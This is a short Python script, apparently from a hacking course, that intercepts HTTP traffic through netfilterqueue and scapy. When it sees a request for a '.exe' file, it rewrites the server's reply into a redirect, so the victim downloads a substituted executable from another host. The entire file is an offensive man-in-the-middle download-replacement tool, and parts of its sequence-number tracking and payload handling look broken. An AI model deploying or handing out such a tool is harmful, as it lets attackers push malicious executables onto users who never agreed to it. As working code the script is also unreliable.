#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# uncomment these lines to set up iptables rules
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].seq) # append TCP sequence number
        elif scapy_packet[scapy.TCP].sport == 80:

            if scapy_packet[scapy.TCP].seq in ack_list:

                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print(f"[+] Replace file")
                scapy_packet[scapy.Raw].load ="HTTP/1.1 301 Moved Permanently\nLocation: http://download.httrack.com/cserv.php3?File=httrack.exe\n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet)) # modify packet payload
    packet.accept() # accept modified packet

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
#print(f"Ack List: {ack_list}")